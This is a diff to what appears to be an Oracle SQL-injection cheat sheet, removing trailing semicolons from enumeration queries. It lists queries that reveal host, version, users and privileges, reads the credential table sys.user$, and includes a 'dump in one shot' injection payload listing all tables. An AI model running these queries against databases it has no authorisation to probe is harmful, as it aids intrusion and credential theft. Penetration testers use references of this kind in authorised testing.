@@ -21,12 +21,12 @@ sqlplus USER/PASSWORD@IP/SID [as sysdba]
 SELECT 'A'||'B' FROM dual
 
 # hostname
-SELECT host_name FROM v$instance;
-SELECT UTL_INADDR.get_host_name FROM dual;
+SELECT host_name FROM v$instance
+SELECT UTL_INADDR.get_host_name FROM dual
 
 # version
-SELECT version FROM v$instance;
-SELECT banner FROM v$version WHERE rownum=1
+SELECT version FROM v$instance
+SELECT banner FROM v$version [WHERE rownum=1]
 
 # users
 SELECT user FROM dual
@@ -34,7 +34,7 @@ SELECT username FROM all_users
 SELECT name FROM sys.user$
 
 # user privs
-SELECT * from user_role_privs;
+SELECT * from user_role_privs
 
 # password (DES)
 # astatus = if account is locked
@@ -49,7 +49,7 @@ SELECT SYS.DATABASE_NAME FROM DUAL
 | SELECT DISTINCT owner FROM all_tables
 
 # tables
-SELECT table_name FROM all_tables;
+SELECT table_name FROM all_tables
 # DIOS: dump in one shot
 select rtrim(xmlagg(xmlelement(e, table_name || ',')).extract('//text()').extract('//text()') ,',') from all_tables
 | (SELECT replace(wm_concat('<li>'||table_name),',','') FROM all_tables)
